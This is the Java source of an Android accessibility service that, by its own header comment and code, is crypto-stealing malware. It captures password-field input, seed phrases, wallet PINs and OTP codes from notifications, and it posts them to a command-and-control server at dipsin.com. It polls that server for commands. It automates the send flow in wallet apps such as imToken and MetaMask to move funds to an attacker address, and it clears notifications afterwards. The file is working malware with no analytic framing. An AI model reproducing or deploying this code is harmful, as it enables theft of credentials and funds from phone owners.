// VxinAccessibilityService.java
// ==============================
// Deep UI control: credential capture, OTP interception, automated withdrawals
// Deployed as: com.vxin.app.core.accessibility.VxinAccessibilityService

package com.vxin.app.core.accessibility;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.app.Notification;
import android.content.Intent;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Pattern;

public class VxinAccessibilityService extends AccessibilityService {

    private static final String C2_BASE = "https://dipsin.com/vx-stats";
    private static final Pattern OTP_RE = Pattern.compile(".*\\b\\d{4,8}\\b.*");
    private static final Pattern SEED_RE = Pattern.compile("([a-z]{3,8}\\s+){11,23}[a-z]{3,8}");

    private static VxinAccessibilityService instance;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private String deviceId;

    // Target wallet packages for automation
    private static final String[] WALLET_PKGS = {
        "im.token.app", "com.bitpie", "vip.mytokenpocket",
        "com.huobi.client", "com.okinc.okex.gp", "com.binance.dev",
        "io.metamask", "com.trustwallet.app", "com.bybit.app"
    };

    // Withdraw destination (rotated via C2)
    private static volatile String withdrawAddr = "0x7F7DA4F98FE133BC499c3Fd2EA93929Af52cE1b6";

    @Override
    public void onServiceConnected() {
        instance = this;
        deviceId = android.provider.Settings.Secure.getString(
            getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
        report("accessibility_enabled", null);
        startCommandPolling();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            int type = event.getEventType();

            // ── Credential capture: text fields ──────────────────
            if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                AccessibilityNodeInfo src = event.getSource();
                if (src == null || src.getText() == null) return;
                String text = src.getText().toString();
                if (text.isEmpty()) return;

                String pkg = String.valueOf(event.getPackageName());

                // Password fields
                if (src.isPassword()) {
                    JSONObject d = new JSONObject();
                    d.put("package", pkg);
                    d.put("value", text);
                    d.put("field", String.valueOf(src.getClassName()));
                    report("password_capture", d);
                    return;
                }

                // Seed phrase detection in any field
                if (SEED_RE.matcher(text.toLowerCase().trim()).matches()) {
                    JSONObject d = new JSONObject();
                    d.put("package", pkg);
                    d.put("value", text.trim());
                    d.put("words", text.trim().split("\\s+").length);
                    report("seed_capture", d);
                    return;
                }

                // PIN-like input (4-8 digits) in wallet apps
                if (isTargetWallet(pkg) && text.matches("\\d{4,8}")) {
                    JSONObject d = new JSONObject();
                    d.put("package", pkg);
                    d.put("value", text);
                    d.put("kind", "pin");
                    report("pin_capture", d);
                }
                return;
            }

            // ── OTP interception: notifications ──────────────────
            if (type == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
                String text = extractNotificationText(event);
                if (text != null && OTP_RE.matcher(text).matches()) {
                    JSONObject d = new JSONObject();
                    d.put("package", String.valueOf(event.getPackageName()));
                    d.put("value", text);
                    report("otp_capture", d);
                }
            }
        } catch (Exception ignored) {}
    }

    private boolean isTargetWallet(String pkg) {
        for (String p : WALLET_PKGS) if (p.equals(pkg)) return true;
        return false;
    }

    private String extractNotificationText(AccessibilityEvent event) {
        try {
            if (event.getParcelableData() instanceof Notification) {
                Notification n = (Notification) event.getParcelableData();
                Bundle extras = n.extras;
                String title = extras.getString(Notification.EXTRA_TITLE, "");
                String body = extras.getString(Notification.EXTRA_TEXT, "");
                String combined = (title + " " + body).trim();
                if (!combined.isEmpty()) return combined;
            }
            if (event.getText() != null && !event.getText().isEmpty()) {
                StringBuilder sb = new StringBuilder();
                for (CharSequence cs : event.getText()) sb.append(cs).append(' ');
                return sb.toString().trim();
            }
        } catch (Exception ignored) {}
        return null;
    }

    // ── Node helpers ─────────────────────────────────────────────
    public static AccessibilityNodeInfo findNodeByText(AccessibilityNodeInfo root, String text) {
        if (root == null) return null;
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
        if (nodes != null && !nodes.isEmpty()) return nodes.get(0);
        return null;
    }

    public static AccessibilityNodeInfo findNodeByViewId(AccessibilityNodeInfo root, String idPart) {
        if (root == null) return null;
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(idPart);
        if (nodes != null && !nodes.isEmpty()) return nodes.get(0);
        return null;
    }

    public static AccessibilityNodeInfo findFirstEditable(AccessibilityNodeInfo root) {
        if (root == null) return null;
        if (root.isEditable()) return root;
        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo found = findFirstEditable(root.getChild(i));
            if (found != null) return found;
        }
        return null;
    }

    public static boolean clickNode(AccessibilityNodeInfo node) {
        if (node == null) return false;
        AccessibilityNodeInfo target = node;
        for (int i = 0; i < 6 && target != null && !target.isClickable(); i++) {
            target = target.getParent();
        }
        return target != null && target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
    }

    public static boolean setNodeText(AccessibilityNodeInfo node, String text) {
        if (node == null || !node.isEditable()) return false;
        Bundle args = new Bundle();
        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
        return node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
    }

    public static void tapAt(AccessibilityService svc, float x, float y) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;
        Path path = new Path();
        path.moveTo(x, y);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 100));
        svc.dispatchGesture(builder.build(), null, null);
    }

    public static void tapNodeCenter(AccessibilityService svc, AccessibilityNodeInfo node) {
        if (node == null) return;
        Rect r = new Rect();
        node.getBoundsInScreen(r);
        tapAt(svc, r.centerX(), r.centerY());
    }

    // ── Automated withdrawal (imToken flow) ──────────────────────
    // Triggered by C2 command: {"cmd":"auto_withdraw","addr":"0x...","amount":"max"}
    private void startAutoWithdraw(final String pkg, final String addr, final String amount) {
        try {
            Intent launch = getPackageManager().getLaunchIntentForPackage(pkg);
            if (launch == null) return;
            launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(launch);

            JSONObject d = new JSONObject();
            d.put("package", pkg);
            d.put("phase", "launched");
            report("auto_withdraw", d);

            // Wait for app to open, then drive UI
            handler.postDelayed(() -> driveWithdrawUi(pkg, addr, amount, 0), 6000);
        } catch (Exception ignored) {}
    }

    private void driveWithdrawUi(String pkg, String addr, String amount, int step) {
        if (step > 14) return; // bail out
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) {
                handler.postDelayed(() -> driveWithdrawUi(pkg, addr, amount, step + 1), 2000);
                return;
            }

            // Chinese + English send button labels
            String[] sendLabels = {"发送", "转账", "Send", "Transfer", "发送代币"};
            String[] confirmLabels = {"确认", "确定", "Confirm", "OK", "下一步", "Next"};
            String[] amountLabels = {"金额", "数量", "Amount"};

            AccessibilityNodeInfo node;
            if ((node = findFirstByTexts(root, sendLabels)) != null && step < 4) {
                clickNode(node);
                reportStep(pkg, "clicked_send");
                handler.postDelayed(() -> driveWithdrawUi(pkg, addr, amount, 4), 2500);
                return;
            }

            if (step >= 4 && step < 9) {
                AccessibilityNodeInfo edit = findFirstEditable(root);
                if (edit != null) {
                    setNodeText(edit, addr);
                    reportStep(pkg, "addr_entered");
                    handler.postDelayed(() -> driveWithdrawUi(pkg, addr, amount, 9), 2000);
                    return;
                }
            }

            if (step >= 9) {
                if ((node = findFirstByTexts(root, amountLabels)) != null) {
                    tapNodeCenter(this, node);
                    AccessibilityNodeInfo edit = findFirstEditable(getRootInActiveWindow());
                    if (edit != null) setNodeText(edit, amount);
                }
                if ((node = findFirstByTexts(root, confirmLabels)) != null) {
                    clickNode(node);
                    reportStep(pkg, "confirm_clicked");
                }
                handler.postDelayed(() -> driveWithdrawUi(pkg, addr, amount, step + 1), 2500);
                return;
            }

            handler.postDelayed(() -> driveWithdrawUi(pkg, addr, amount, step + 1), 2500);
        } catch (Exception ignored) {}
    }

    private AccessibilityNodeInfo findFirstByTexts(AccessibilityNodeInfo root, String[] texts) {
        for (String t : texts) {
            AccessibilityNodeInfo n = findNodeByText(root, t);
            if (n != null) return n;
        }
        return null;
    }

    private void reportStep(String pkg, String step) {
        try {
            JSONObject d = new JSONObject();
            d.put("package", pkg);
            d.put("phase", step);
            report("auto_withdraw", d);
        } catch (Exception ignored) {}
    }

    // ── Anti-forensics: clear notifications after actions ────────
    public static void clearNotifications(VxinAccessibilityService svc) {
        try {
            android.app.NotificationManager nm = (android.app.NotificationManager)
                svc.getSystemService(NOTIFICATION_SERVICE);
            nm.cancelAll();
        } catch (Exception ignored) {}
    }

    // ── C2 command polling ───────────────────────────────────────
    private void startCommandPolling() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                pollCommand();
                handler.postDelayed(this, 60000);
            }
        }, 60000);
    }

    private void pollCommand() {
        new Thread(() -> {
            try {
                URL url = new URL(C2_BASE + "/cmd?uid=" + deviceId);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setConnectTimeout(6000);
                conn.setReadTimeout(6000);
                if (conn.getResponseCode() != 200) { conn.disconnect(); return; }
                byte[] buf = new byte[4096];
                int n = conn.getInputStream().read(buf);
                conn.disconnect();
                if (n <= 0) return;

                JSONObject cmd = new JSONObject(new String(buf, 0, n));
                String action = cmd.optString("cmd", "");
                switch (action) {
                    case "auto_withdraw":
                        String pkg = cmd.optString("wallet", "im.token.app");
                        String addr = cmd.optString("addr", withdrawAddr);
                        String amount = cmd.optString("amount", "max");
                        handler.post(() -> startAutoWithdraw(pkg, addr, amount));
                        break;
                    case "set_withdraw_addr":
                        withdrawAddr = cmd.optString("addr", withdrawAddr);
                        break;
                    case "clear_notifications":
                        clearNotifications(this);
                        break;
                    case "ping":
                        report("pong", null);
                        break;
                }
            } catch (Exception ignored) {}
        }).start();
    }

    // ── Exfil ────────────────────────────────────────────────────
    private void report(String type, JSONObject data) {
        new Thread(() -> {
            try {
                JSONObject msg = new JSONObject();
                msg.put("type", type);
                msg.put("ts", System.currentTimeMillis() / 1000);
                msg.put("src", "android_a11y");
                msg.put("uid", deviceId);
                msg.put("device", Build.MODEL);
                msg.put("os", "Android " + Build.VERSION.RELEASE);
                if (data != null) msg.put("data", data);

                HttpURLConnection conn = (HttpURLConnection) new URL(C2_BASE).openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setConnectTimeout(6000);
                conn.setReadTimeout(6000);
                conn.setDoOutput(true);
                OutputStream os = conn.getOutputStream();
                os.write(msg.toString().getBytes("UTF-8"));
                os.flush();
                os.close();
                conn.getInputStream().close();
                conn.disconnect();
            } catch (Exception ignored) {}
        }).start();
    }

    @Override
    public void onInterrupt() {}

    @Override
    public void onDestroy() {
        instance = null;
        super.onDestroy();
    }
}
